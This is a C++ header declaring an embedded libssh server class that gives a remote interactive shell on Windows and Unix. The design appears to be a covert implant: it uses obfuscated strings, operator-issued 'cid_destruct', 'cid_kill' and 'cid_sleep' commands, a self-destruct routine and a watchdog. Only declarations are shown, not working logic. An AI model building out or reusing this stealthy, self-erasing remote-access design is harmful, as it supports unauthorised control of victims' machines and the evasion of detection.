#pragma once

#include <string>
#include <atomic>
#include <chrono>
#include <thread>
#ifdef _WIN32
#	define WIN32_LEAN_AND_MEAN // revisar
#	include <Windows.h>
#endif // _WIN32

#include <libssh/callbacks.h>
#include <libssh/server.h>

#include "global.h"
#include "obfuscated_strings.h"

#ifdef HAVE_PTHREAD
#	include <pthread.h>
#endif

struct win_size
{
	int col;
	int row;
};

enum Termination_type
{
	NONE = 0,
	SLEEP = 1,
	DESTRUCT = 2,
	KILL = 3
};

class CidSSHServer
{
private:
#ifdef _WIN32
	
#endif

public:
    CidSSHServer();
    ~CidSSHServer();

	int run();
    void stop();

	static std::atomic<bool> isSSHServerRunning;
	static std::atomic<Termination_type> operatorOrderedTermination;
    // The port the server will be listening on
    static unsigned int listeningPort;
	static std::chrono::seconds sleep_duration;

private:

#ifdef _WIN32
	static int windows_poll_channel(ssh_channel chan, void *userdata);
	void init_TTY_windows();
	typedef HRESULT(WINAPI *my_CreatePseudoConsole)(_In_ COORD, _In_ HANDLE,
													_In_ HANDLE, _In_ DWORD,
													_Out_ HPCON *);

	typedef void(WINAPI *my_ResizePseudoConsole)(_In_ HPCON hPC, _In_ COORD size);

	typedef void(WINAPI *my_ClosePseudoConsole)(_Out_ HPCON);
#else
	static int copy_fd_to_chan(socket_t fd, int revents, void* userdata);
#endif
	
	static int copy_chan_to_fd(ssh_session session,
							   ssh_channel channel,
							   void* data,
							   uint32_t len,
							   int is_stderr,
							   void* userdata);
	static void self_destruct();
	
	static void chan_close(ssh_session session, ssh_channel channel, void* userdata);
	
	static void init_cid_commands();
	
	static socket_t bind_socket_non_reuse(ssh_bind sshbind, const char* hostname, int port);

	static std::atomic<bool> stop_SSH_server;
	static std::atomic<bool> operatorOrderedSleep;
	
	int gen_rsa_keys();

	static int
	auth_password(ssh_session session, const char* user, const char* password, void* userdata);

	static int bind_incoming_connection(socket_t fd, int revents, void* userdata);

	static int my_ssh_channel_pty_window_change_callback(ssh_session session,
														 ssh_channel channel,
														 int width,
														 int height,
														 int pxwidth,
														 int pwheight,
														 void* userdata);

	static thread_rettype_t main_loop_shell(void* userdata);

	static int message_callback(ssh_session session, ssh_message message, void* userdata);

	static thread_rettype_t per_conn_thread(void* args);

	static void server_watchdog();

#ifdef _WIN32
	static my_CreatePseudoConsole my_CreatePseudoConsole_function;
	static my_ResizePseudoConsole my_ResizePseudoConsole_function;
	static my_ClosePseudoConsole my_ClosePseudoConsole_function;
	static HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX* pStartupInfo,
																HPCON hPC);
	static HRESULT
	CreatePseudoConsoleAndPipes(HPCON* phPC, HANDLE* phPipeIn, HANDLE* phPipeOut, COORD win_size);
#endif // _WIN32

#ifdef _WIN32
	struct data_arg
	{
		HANDLE hPipeOut;
		HANDLE hPipeIn;
		struct thread_info_struct* thread_info;
		char last_command[64];
		int index;
		HPCON pty_handle;
	};
#else
	struct data_arg
	{
		int fd;
		char last_command[64];
		int index;
	};
#endif

	static int is_pty;

	ssh_key pkey;

	static char destruct_command[sizeof "cid_destruct\r"];
	static char kill_command[sizeof "cid_kill\r"];
	static char sleep_command[sizeof "cid_sleep "];
};
